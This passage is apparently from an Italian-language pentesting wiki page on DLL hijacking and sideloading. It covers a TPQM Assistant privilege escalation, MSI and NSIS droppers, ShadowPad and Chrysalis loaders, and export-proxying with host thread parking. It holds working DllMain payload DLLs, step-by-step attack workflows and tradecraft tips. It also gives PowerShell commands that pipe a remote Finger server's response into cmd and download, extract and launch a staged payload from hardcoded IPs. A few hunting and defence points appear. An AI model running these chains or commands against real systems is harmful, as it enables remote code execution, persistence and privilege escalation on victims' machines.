- **DLL Search Behavior**: Tenta prima di caricare `hostfxr.dll` dalla sua working directory e registra "NAME NOT FOUND" se manca, indicando la precedenza della ricerca nella directory locale.

### Exploit Implementation

Un attacker può piazzare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere code execution nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Come standard user, inserisci `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che il scheduled task venga eseguito alle 9:30 AM nel contesto dell'utente corrente.
3. Se un administrator è logged in quando il task viene eseguito, la DLL malevola viene eseguita nella sessione dell'administrator con medium integrity.
4. Catena tecniche standard di UAC bypass per elevare da medium integrity a privilegi SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

I threat actors spesso combinano dropper basati su MSI con DLL side-loading per eseguire payload sotto un processo trusted e signed.

Panoramica della chain
- L'utente scarica l'MSI. Una CustomAction viene eseguita in silenzio durante l'installazione GUI (ad es. LaunchApplication o un'azione VBScript), ricostruendo la fase successiva da risorse embedded.
- Il dropper scrive un EXE legittimo, signed, e una DLL malevola nella stessa directory (coppia di esempio: wsc_proxy.exe signed da Avast + wsc.dll controllata dall'attaccante).
- Quando viene avviato l'EXE signed, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla directory di lavoro, eseguendo il codice dell'attaccante sotto un parent signed (ATT&CK T1574.001).

Analisi MSI (cosa cercare)
- Tabella CustomAction:
- Cerca voci che eseguono executable o VBScript. Pattern sospetto di esempio: LaunchApplication che esegue un file embedded in background.
- In Orca (Microsoft Orca.exe), ispeziona le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload embedded/split nel CAB dell'MSI:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usa lessmsi: lessmsi x package.msi C:\out
- Cerca più frammenti piccoli che vengono concatenati e decrypted da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Drop these two files in the same folder:
- wsc_proxy.exe: host firmato legittimo (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: DLL dell'attaccante. Se non sono richieste export specifiche, DllMain può essere sufficiente; altrimenti, crea una proxy DLL e inoltra le export richieste alla libreria genuina mentre esegui il payload in DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un framework di proxying (per esempio DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome della DLL da parte del binary host. Se l'host usa path assoluti o safe loading flags (per esempio LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack può fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedenza e vanno considerati durante la selezione del binary host e del set di export.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per mimetizzarsi con software legittimo mantenendo il core payload cifrato su disco:

1. **Signed host EXE** - vendor come AMD, Realtek o NVIDIA vengono abusati (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l'executable per farlo sembrare un binary Windows (per esempio `conhost.exe`), ma la firma Authenticode resta valida.
2. **Malicious loader DLL** - rilasciata accanto all'EXE con un nome atteso (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è di solito un binary MFC offuscato con il framework ScatterBrain; il suo unico compito è localizzare il blob cifrato, decifrarlo e mappare ShadowPad in modo reflective.
3. **Encrypted payload blob** - spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo il memory-mapping del payload decifrato, il loader elimina il file TMP per distruggere le prove forensi.

Tradecraft notes:

* Rinominare l'EXE firmato (mantenendo però l'`OriginalFileName` originale nell'intestazione PE) gli consente di mascherarsi da binary Windows pur mantenendo la firma del vendor, quindi replica l'abitudine di Ink Dragon di rilasciare binary dall'aspetto di `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l'executable resta trusted, la maggior parte dei controlli di allowlisting richiede solo che la tua DLL malevola sia posizionata accanto ad esso. Concentrati sulla personalizzazione della loader DLL; il parent firmato può in genere essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e sia scrivibile, così può azzerare il file dopo il mapping. Mantieni la directory scrivibile fino al caricamento del payload; una volta in memoria il file TMP può essere eliminato in sicurezza per OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Gli operatori combinano DLL sideloading con LOLBAS così che l'unico artefatto custom su disco sia la DLL malevola accanto all'EXE trusted:

- **Remote command loader (Finger):** PowerShell nascosto avvia `cmd.exe /c`, preleva i comandi da un server Finger e li pipe-a a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` recupera testo TCP/79; `| cmd` esegue la risposta del server, consentendo agli operatori di ruotare il server di seconda fase lato server.

- **Built-in download/extract:** Scarica un archivio con estensione innocua, lo decomprime e prepara il target per il sideload insieme alla DLL sotto una cartella casuale `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde l'avanzamento e segue i redirect; `tar -xf` usa il tar integrato in Windows.

- **WMI/CIM Launch:** Avvia l'EXE via WMI così la telemetria mostra un processo creato via CIM mentre carica la DLL collocata localmente:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binary che preferiscono DLL locali (per esempio `intelbq.exe`, `nearby_share.exe`); il payload (per esempio Remcos) gira sotto il nome trusted.

- **Hunting:** Genera alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; insolito fuori da script di amministrazione.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una recente intrusione di Lotus Blossom ha abusato di una trusted update chain per distribuire un dropper impacchettato in NSIS che ha preparato un DLL sideload più payload completamente in memoria.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca come **HIDDEN**, rilascia un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una `log.dll` malevola e un blob cifrato `BluetoothService`, poi avvia l'EXE.
- L'host EXE importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` effettua il load del blob via mmap; `LogWrite` lo decifra con uno stream custom basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in plaintext, libera i temporanei e salta ad esso.
- Per evitare una IAT, il loader risolve le API hashando i nomi export con **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, poi applica un avalanching in stile Murmur (**0x85EBCA6B**) e confronta il risultato con hash target salati.

Main shellcode (Chrysalis)
- Decifra un main module simile a un PE ripetendo add/XOR/sub con la chiave `gQ2JR&9;` per cinque passaggi, poi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione degli import.
- Ricostruisce a runtime le stringhe dei nomi DLL tramite trasformazioni per carattere di bit-rotate/XOR, poi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre **PEB → InMemoryOrderModuleList**, analizza ogni export table in blocchi da 4 byte con mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Embedded configuration & C2
- La config si trova dentro il file `BluetoothService` rilasciato, all'**offset 0x30808** (size **0x980**) ed è decifrata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
- I beacon costruiscono un profilo host separato da punti, aggiungono il tag `4Q`, poi cifrano con RC4 usando la chiave `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le risposte vengono decifrate con RC4 e instradate da uno switch di tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- La modalità di esecuzione è controllata dagli argomenti CLI: senza argomenti = installa persistenza (service/Run key) puntando a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l'installazione ed esegue il payload.

Alternate loader observed
- La stessa intrusione ha rilasciato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il sorgente C fornito dall'attaccante incorporava shellcode, lo compilava ed eseguiva in memoria senza toccare il disco con un PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase di compile-and-run basata su TCC importava `Wininet.dll` a runtime e recuperava una shellcode di seconda fase da un URL hardcoded, offrendo un loader flessibile che si mascherava da esecuzione di un compilatore.

## Signed-host sideloading con export proxying + host thread parking

Alcune chain di DLL sideloading aggiungono **stability engineering** così l'host legittimo resta vivo abbastanza a lungo da caricare le fasi successive in modo pulito invece di andare in crash dopo il caricamento della DLL malevola.

Pattern osservato
- Rilascia un EXE trusted accanto a una DLL malevola usando il nome di dipendenza previsto, come `version.dll`.
- La DLL malevola **fa proxy di ogni export atteso** verso la vera DLL di sistema (per esempio `%SystemRoot%\\System32\\version.dll`) così la risoluzione degli import continua a riuscire e il processo host resta operativo.
- Dopo il load, la DLL malevola **patcha l'entry point dell'host** in modo che il thread principale finisca in un loop infinito di `Sleep` invece di uscire o eseguire code path che terminerebbero il processo.
- Un nuovo thread esegue il vero lavoro malevolo: decrittare il nome o il path della DLL di next-stage (RC4/XOR sono comuni), poi avviarla con `LoadLibrary`.

Perché questo conta
- Il normal DLL proxying preserva la compatibilità API, ma non garantisce che l'host resti vivo abbastanza a lungo per le fasi successive.
- Mettere in parking il thread principale in `Sleep(INFINITE)` è un modo semplice per mantenere il processo signed residente mentre il loader esegue decrittazione, staging o bootstrap di rete in un worker thread.
- Cercare solo un `DllMain` sospetto può far perdere questo pattern se il comportamento interessante avviene dopo che l'entry point dell'host è stato patchato e parte un thread secondario.

Workflow minimo
1. Copia l'EXE host signed e determina la DLL che risolve dalla directory locale.
2. Crea una DLL proxy che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, crea un worker thread.
4. Da quel thread, patcha l'entry point dell'host o la routine di avvio del main thread in modo che faccia loop su `Sleep`.
5. Decripta il nome/config della DLL di next-stage e chiama `LoadLibrary` o esegui il manual-map del payload.

Punti di difesa
- Processi signed che caricano `version.dll` o librerie comunemente simili dalla propria application directory invece che da `System32`.
- Patch di memoria all'entry point del processo poco dopo il load dell'immagine, soprattutto salti/chiamate reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una DLL proxy che chiamano subito `LoadLibrary` su una seconda DLL con nome decriptato.
- DLL proxy full-export piazzate accanto a executable vendor dentro directory di staging scrivibili come `ProgramData`, `%TEMP%` o path di archivi estratti.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
